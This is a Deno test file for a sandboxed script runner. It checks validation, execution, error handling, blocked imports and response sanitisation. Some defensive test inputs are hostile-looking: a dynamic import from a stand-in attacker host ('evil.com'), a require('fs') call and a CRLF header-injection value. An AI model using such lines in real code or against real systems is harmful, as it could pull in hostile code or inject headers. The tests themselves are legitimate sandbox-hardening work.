/**
 * Tests for the script runner service.
 *
 * Tests script execution in the sandboxed Deno Worker.
 * Requires --allow-net --allow-env --allow-read --unstable-worker-options flags.
 *
 * Table-driven where possible. Each execution test is
 * [label, script, assertFn(result)].
 */

import { assertEquals } from "@std/assert";
import { runScript } from "../script-runner.ts";
import type { ScriptRequest, ScriptResult } from "../../types.ts";

const BASE_REQUEST: ScriptRequest = {
  method: "POST",
  headers: { "content-type": "application/json" },
  query: { key: "value" },
  body: '{"test":true}',
  url: "http://localhost/w/test",
};

// ── Input validation (no worker spawned) ────────────────────────────

const inputValidationCases: [string, string | null, boolean, string?][] = [
  // [label, script, expectSuccess, errorContains?]
  ["empty string", "", false, "empty or invalid"],
  ["null script", null as unknown as string, false, "empty or invalid"],
  ["script exceeding 65536 bytes", "x".repeat(65537), false, "too large"],
];

for (const [label, script, expectSuccess, errorContains] of inputValidationCases) {
  Deno.test(`runScript input validation: ${label}`, async () => {
    const result = await runScript(script as string, BASE_REQUEST);
    assertEquals(result.success, expectSuccess);
    if (errorContains) {
      assertEquals(
        result.error?.toLowerCase().includes(errorContains.toLowerCase()),
        true,
        `expected error containing "${errorContains}", got: ${result.error}`,
      );
    }
  });
}

// ── Successful script execution ─────────────────────────────────────

const successCases: [string, string, (r: ScriptResult) => void][] = [
  [
    "returns custom status and body",
    'return { status: 201, headers: {"Content-Type": "application/json"}, body: JSON.stringify({created: true}) };',
    (r) => {
      assertEquals(r.success, true);
      assertEquals(r.response!.status, 201);
      assertEquals(JSON.parse(r.response!.body).created, true);
    },
  ],
  [
    "returns minimal response (status only)",
    "return { status: 204 };",
    (r) => {
      assertEquals(r.success, true);
      assertEquals(r.response!.status, 204);
    },
  ],
  [
    "returns undefined (fallback to default)",
    "// no return",
    (r) => {
      assertEquals(r.success, true);
      assertEquals(r.response!.status, 200);
    },
  ],
  [
    "reads request.method",
    'return { status: 200, body: request.method };',
    (r) => {
      assertEquals(r.success, true);
      assertEquals(r.response!.body, "POST");
    },
  ],
  [
    "reads request.query",
    'return { status: 200, body: request.query.key };',
    (r) => {
      assertEquals(r.success, true);
      assertEquals(r.response!.body, "value");
    },
  ],
  [
    "reads request.body",
    'return { status: 200, body: request.body };',
    (r) => {
      assertEquals(r.success, true);
      assertEquals(r.response!.body, '{"test":true}');
    },
  ],
  [
    "reads request.headers",
    'return { status: 200, body: request.headers["content-type"] };',
    (r) => {
      assertEquals(r.success, true);
      assertEquals(r.response!.body, "application/json");
    },
  ],
  [
    "uses Date.now()",
    'return { status: 200, body: String(typeof Date.now()) };',
    (r) => {
      assertEquals(r.success, true);
      assertEquals(r.response!.body, "number");
    },
  ],
  [
    "uses JSON.stringify",
    'return { status: 200, body: JSON.stringify({a:1}) };',
    (r) => {
      assertEquals(r.success, true);
      assertEquals(r.response!.body, '{"a":1}');
    },
  ],
  [
    "uses Math",
    'return { status: 200, body: String(Math.max(1,2,3)) };',
    (r) => {
      assertEquals(r.success, true);
      assertEquals(r.response!.body, "3");
    },
  ],
  [
    "async script with await",
    'const x = await Promise.resolve(42); return { status: 200, body: String(x) };',
    (r) => {
      assertEquals(r.success, true);
      assertEquals(r.response!.body, "42");
    },
  ],
];

for (const [label, script, assertFn] of successCases) {
  Deno.test(`runScript success: ${label}`, async () => {
    const result = await runScript(script, BASE_REQUEST);
    assertFn(result);
  });
}

// ── Script error handling ───────────────────────────────────────────

const errorCases: [string, string][] = [
  ["runtime error (undefined var)", "return undefinedVariable;"],
  ["type error", "null.property;"],
  ["syntax error in body", "return {{{;"],
  ["throw string", 'throw "custom error";'],
  ["throw Error", 'throw new Error("boom");'],
];

for (const [label, script] of errorCases) {
  Deno.test(`runScript error: ${label}`, async () => {
    const result = await runScript(script, BASE_REQUEST);
    assertEquals(result.success, false);
    assertEquals(typeof result.error, "string");
    assertEquals(result.error!.length > 0, true);
  });
}

// ── Blocked patterns ────────────────────────────────────────────────

const blockedPatternCases: [string, string][] = [
  ["dynamic import()", 'const m = import("http://evil.com");'],
  ["static import", 'import foo from "bar";'],
  ["require()", 'const fs = require("fs");'],
];

for (const [label, script] of blockedPatternCases) {
  Deno.test(`runScript blocked pattern: ${label}`, async () => {
    const result = await runScript(script, BASE_REQUEST);
    assertEquals(result.success, false);
    assertEquals(
      result.error?.toLowerCase().includes("blocked"),
      true,
      `expected 'blocked' in error, got: ${result.error}`,
    );
  });
}

// ── Response sanitization ───────────────────────────────────────────

const sanitizationCases: [string, string, (r: ScriptResult) => void][] = [
  [
    "invalid status code gets clamped",
    "return { status: 9999 };",
    (r) => {
      assertEquals(r.success, true);
      assertEquals(r.response!.status, 599);
    },
  ],
  [
    "negative status code gets clamped to 100",
    "return { status: -1 };",
    (r) => {
      assertEquals(r.success, true);
      assertEquals(r.response!.status, 100);
    },
  ],
  [
    "non-numeric status defaults to 200",
    'return { status: "ok" };',
    (r) => {
      assertEquals(r.success, true);
      assertEquals(r.response!.status, 200);
    },
  ],
  [
    "blocked header (set-cookie) is filtered",
    'return { status: 200, headers: {"Set-Cookie": "evil", "X-Ok": "yes"}, body: "ok" };',
    (r) => {
      assertEquals(r.success, true);
      assertEquals(r.response!.headers["Set-Cookie"], undefined);
      assertEquals(r.response!.headers["X-Ok"], "yes");
    },
  ],
  [
    "CRLF in header value is stripped",
    'return { status: 200, headers: {"X-Inject": "val\\r\\nEvil: hdr"}, body: "ok" };',
    (r) => {
      assertEquals(r.success, true);
      assertEquals(r.response!.headers["X-Inject"], "valEvil: hdr");
    },
  ],
  [
    "non-string body gets JSON.stringified",
    "return { status: 200, body: {key: 'val'} };",
    (r) => {
      assertEquals(r.success, true);
      // non-string body → the worker JSON.stringifies the full result
      const parsed = JSON.parse(r.response!.body);
      assertEquals(typeof parsed, "object");
    },
  ],
];

for (const [label, script, assertFn] of sanitizationCases) {
  Deno.test(`runScript sanitization: ${label}`, async () => {
    const result = await runScript(script, BASE_REQUEST);
    assertFn(result);
  });
}

// ── Request body truncation ─────────────────────────────────────────

Deno.test("runScript: truncates oversized request body", async () => {
  const largeBody = "x".repeat(1_048_576 + 100); // slightly over 1MB
  const request: ScriptRequest = {
    ...BASE_REQUEST,
    body: largeBody,
  };
  const result = await runScript(
    "return { status: 200, body: String(request.body.length) };",
    request,
  );
  assertEquals(result.success, true);
  // Body should be truncated to MAX_REQUEST_BODY_SIZE (1MB)
  assertEquals(result.response!.body, String(1_048_576));
});

// ── Request immutability ────────────────────────────────────────────

Deno.test("runScript: request object is frozen", async () => {
  const result = await runScript(
    `
    try {
      request.method = "HACKED";
      return { status: 200, body: request.method };
    } catch(e) {
      return { status: 200, body: "frozen" };
    }
    `,
    BASE_REQUEST,
  );
  assertEquals(result.success, true);
  // In strict mode, assigning to frozen object throws
  assertEquals(result.response!.body, "frozen");
});
